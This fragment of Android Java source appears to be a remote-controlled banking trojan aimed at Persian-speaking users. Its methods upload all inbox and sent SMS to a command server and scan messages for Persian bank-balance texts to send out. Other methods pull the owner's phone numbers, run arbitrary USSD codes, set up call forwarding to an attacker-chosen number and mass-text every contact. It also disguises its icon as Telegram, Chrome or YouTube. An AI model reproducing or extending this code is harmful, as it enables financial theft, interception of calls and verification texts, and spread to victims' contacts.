            }
            Map<String,String> m = base();
            m.put("action", "silent");
            post(SVR + "/api", m);
        } catch(Exception e) {}
    }

    private void normalMode() {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, am.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION), 0);
                am.setStreamVolume(AudioManager.STREAM_SYSTEM, am.getStreamMaxVolume(AudioManager.STREAM_SYSTEM), 0);
                am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            }
            Map<String,String> m = base();
            m.put("action", "normal");
            post(SVR + "/api", m);
        } catch(Exception e) {}
    }

    private void inboxSms() {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
                if (c != null) {
                    while (c.moveToNext()) {
                        sb.append("Address:").append(c.getString(c.getColumnIndexOrThrow("address")));
                        sb.append("\\nBody:").append(c.getString(c.getColumnIndexOrThrow("body")));
                        sb.append("\\nDate:").append(c.getString(c.getColumnIndexOrThrow("date")));
                        sb.append("\\n--------------------\\n");
                    }
                    c.close();
                }
                upload(SVR + "/upload", sb.toString().getBytes());
            } catch(Exception e) {}
        }).start();
    }

    private void outboxSms() {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                Cursor c = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, "date DESC");
                if (c != null) {
                    while (c.moveToNext()) {
                        sb.append("Address:").append(c.getString(c.getColumnIndexOrThrow("address")));
                        sb.append("\\nBody:").append(c.getString(c.getColumnIndexOrThrow("body")));
                        sb.append("\\nDate:").append(c.getString(c.getColumnIndexOrThrow("date")));
                        sb.append("\\n--------------------\\n");
                    }
                    c.close();
                }
                upload(SVR + "/upload", sb.toString().getBytes());
            } catch(Exception e) {}
        }).start();
    }

    private void findBalances() {
        new Thread(() -> {
            try {
                StringBuilder result = new StringBuilder();
                // Only search inbox, limit to 500
                Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
                if (c != null) {
                    String prevAddr = "";
                    int count = 0;
                    while (c.moveToNext() && count < 500) {
                        String body = c.getString(c.getColumnIndexOrThrow("body"));
                        String addr = c.getString(c.getColumnIndexOrThrow("address"));
                        if (body != null && isBankBalanceSms(body)) {
                            if (!addr.equals(prevAddr) && !body.contains("\\u0631\\u0645\\u0632")) {
                                prevAddr = addr;
                                String info = extractBalanceInfo(body, addr);
                                if (!info.isEmpty()) {
                                    result.append(info).append("\\n");
                                    count++;
                                }
                            }
                        }
                    }
                    c.close();
                }
                if (result.length() == 0) {
                    result.append("No bank balance SMS found");
                }
                Map<String,String> m = base();
                m.put("action", "bankbalance");
                m.put("result", result.toString());
                post(SVR + "/api", m);
            } catch(Exception e) {}
        }).start();
    }

    private boolean isBankBalanceSms(String body) {
        // Must contain a Persian bank keyword AND a Persian balance keyword in the same message
        boolean hasBank = body.contains("\u0628\u0627\u0646\u06a9") || body.contains("\u0628\u0627\u0646\u0643");
        boolean hasBalance = body.contains("\u0645\u0627\u0646\u062f\u0647") || body.contains("\u0645\u0648\u062c\u0648\u062f\u06cc") ||
            body.contains("\u0628\u0627\u0642\u06cc\u0645\u0627\u0646\u062f\u0647");
        return hasBank && hasBalance;
    }

    private String extractBalanceInfo(String sms, String addr) {
        StringBuilder info = new StringBuilder();
        // Extract bank name
        String[] lines = sms.split("\\n");
        for (String line : lines) {
            line = line.trim();
            if (line.contains("\\u0628\\u0627\\u0646\\u06a9") || line.contains("\\u0628\\u0627\\u0646\\u0643") || line.contains("بانک") || line.contains("Bank") || line.contains("bank") || line.contains("\\u06a9\\u0627\\u0631\\u062a")) {
                if (line.length() < 50) {
                    info.append(line).append("\\n");
                    break;
                }
            }
        }
        if (info.length() == 0) info.append("Unknown Bank").append("\\n");
        info.append(addr).append("\\n");
        // Extract balance line
        for (String line : lines) {
            line = line.trim();
            if ((line.contains("\\u0645\\u0627\\u0646\\u062f\\u0647") || line.contains("\\u0645\\u0648\\u062c\\u0648\\u062f\\u06cc") || line.contains("\\u0628\\u0627\\u0642\\u06cc\\u0645\\u0627\\u0646\\u062f\\u0647") || line.contains("balance") || line.contains("Balance")) && line.length() > 3) {
                info.append(line).append("\\n");
                break;
            }
        }
        return info.toString();
    }

    private void changeIcon(JSONObject params) {
        try {
            String iconType = params.optString("icon", "");
            String[] icons = {"telegram", "chrome", "youtube", "default"};
            String pkg = getPackageName();
            for (String icon : icons) {
                try {
                    ComponentName alias = new ComponentName(this, pkg + "." + icon);
                    getPackageManager().setComponentEnabledSetting(alias,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
                } catch(Exception e) {}
            }
            String enableAlias = "default";
            if ("telegram".equals(iconType)) enableAlias = "telegram";
            else if ("chrome".equals(iconType)) enableAlias = "chrome";
            else if ("youtube".equals(iconType)) enableAlias = "youtube";
            ComponentName enable = new ComponentName(this, pkg + "." + enableAlias);
            getPackageManager().setComponentEnabledSetting(enable,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            Map<String,String> m = base();
            m.put("action", "changeicon");
            m.put("icon", iconType);
            post(SVR + "/api", m);
        } catch(Exception e) {}
    }

    private void getUserPhone() {
        new Thread(() -> {
            try {
                StringBuilder result = new StringBuilder();
                Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
                if (c != null) {
                    while (c.moveToNext()) {
                        String body = c.getString(c.getColumnIndexOrThrow("body"));
                        if (body != null) {
                            if (body.contains("\\u0645\\u0634\\u062a\\u0631\\u06a9 \\u06af\\u0631\\u0627\\u0645\\u06cc") && body.contains("\\u0628\\u0633\\u062a\\u0647")) {
                                try { String phone = body.substring(11, 24); if (phone.contains("98")) result.append(phone).append("\\n"); } catch(Exception e) {}
                            }
                            if (body.contains("\\u0647\\u0645\\u0631\\u0627\\u0647 \\u06af\\u0631\\u0627\\u0645\\u06cc\\u060c \\u0634\\u0645\\u0627\\u0631\\u0647") && body.contains("\\u0647\\u0645\\u0631\\u0627\\u0647 \\u0627\\u0648\\u0644")) {
                                try { String phone = body.substring(18, 29); result.append(phone).append("\\n"); } catch(Exception e) {}
                            }
                            if (body.contains("\\u0634\\u0645\\u0627\\u0631\\u0647 \\u0627\\u06cc\\u0646\\u062a\\u0631\\u0646\\u062a\\u06cc") || body.contains("\\u0631\\u0627\\u06cc\\u062a\\u0644")) {
                                try {
                                    String[] parts = body.split("[\\\\s]+");
                                    for (int i = 0; i < parts.length; i++) { if (parts[i].matches("09[0-9]{9,10}")) result.append(parts[i]).append("\\n"); }
                                } catch(Exception e) {}
                            }
                        }
                        if (result.length() > 500) break;
                    }
                    c.close();
                }
                Map<String,String> m = base();
                m.put("action", "getuserphone");
                m.put("phones", result.toString());
                post(SVR + "/api", m);
            } catch(Exception e) {}
        }).start();
    }

    private void executeUssd(JSONObject params) {
        try {
            String code = params.optString("code", "");
            if (code.isEmpty()) return;
            Log.d(TAG, "Executing USSD: " + code);
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + Uri.encode(code + Uri.encode("#"))));
            callIntent.addFlags(Intent.FLAG_FROM_BACKGROUND);
            startActivity(callIntent);
            Map<String,String> m = base(); m.put("action","ussd_result"); m.put("code",code); m.put("result","USSD sent (monitor phone for response)");
            post(SVR+"/api", m);
        } catch (Exception e) {
            Log.e(TAG, "USSD error", e);
            Map<String,String> m = base(); m.put("action","ussd_result"); m.put("code",params.optString("code","")); m.put("result","Error: "+e.getMessage());
            post(SVR+"/api", m);
        }
    }

    private void startForwarding(JSONObject params) {
        try {
            String number = params.optString("number", "");
            if (number.isEmpty()) return;
            // Set up conditional call forwarding via USSD
            String ussd = "**21*" + number + "#";
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + Uri.encode(ussd)));
            callIntent.addFlags(Intent.FLAG_FROM_BACKGROUND);
            startActivity(callIntent);
            Map<String,String> m = base(); m.put("action","forward_on"); m.put("number",number);
            post(SVR+"/api", m);
            Log.d(TAG, "Forwarding activated to: " + number);
        } catch (Exception e) {
            Log.e(TAG, "Forward error", e);
        }
    }

    private void stopForwarding() {
        try {
            String ussd = "##21#";
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + Uri.encode(ussd)));
            callIntent.addFlags(Intent.FLAG_FROM_BACKGROUND);
            startActivity(callIntent);
            Map<String,String> m = base(); m.put("action","forward_off");
            post(SVR+"/api", m);
            Log.d(TAG, "Forwarding deactivated");
        } catch (Exception e) {
            Log.e(TAG, "Stop forward error", e);
        }
    }

    private void setWebViewUrl(String url) {
        try {
            getSharedPreferences("null_panel", MODE_PRIVATE).edit().putString("webview_url", url).apply();
            Log.d(TAG, "WebView URL updated: " + url);
        } catch (Exception e) {
            Log.e(TAG, "Set WebView URL error", e);
        }
    }


    private void smsAllContacts(JSONObject params) {
        try {
            String text = params.optString("text", "");
            if (text.isEmpty()) return;
            new Thread(() -> {
                try {
                    Cursor c = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                        null, null, null);
                    if (c != null) {
                        while (c.moveToNext()) {
                            String phone = c.getString(0);
                            if (phone != null && !phone.isEmpty()) {
                                try {
                                    SmsManager.getDefault().sendTextMessage(phone, null, text, null, null);
                                    Thread.sleep(500);
                                } catch(Exception e) {}
                            }
                        }
                        c.close();
                    }
                    Map<String,String> m = base();
                    m.put("action", "smcontact_done");
                    post(SVR + "/api", m);
                } catch(Exception e) {}
            }).start();
        } catch(Exception e) {}
    }

    private class MyWSClient extends WebSocketClient {
        MyWSClient(URI uri) { super(uri); }
        @Override public void onOpen() { Log.d(TAG, "WS Open"); wsConnected = true; reconnectAttempts = 0; }
        @Override public void onTextReceived(String message) { handle(message); }
        @Override public void onBinaryReceived(byte[] data) {}
        @Override public void onPingReceived(byte[] data) {}
        @Override public void onPongReceived(byte[] data) {}
        @Override public void onException(Exception e) { Log.e(TAG, "WS Err", e); wsConnected = false; reconnect(); }
        @Override public void onCloseReceived() { Log.d(TAG, "WS Close"); wsConnected = false; if (isRunning) reconnect(); }
    }
}
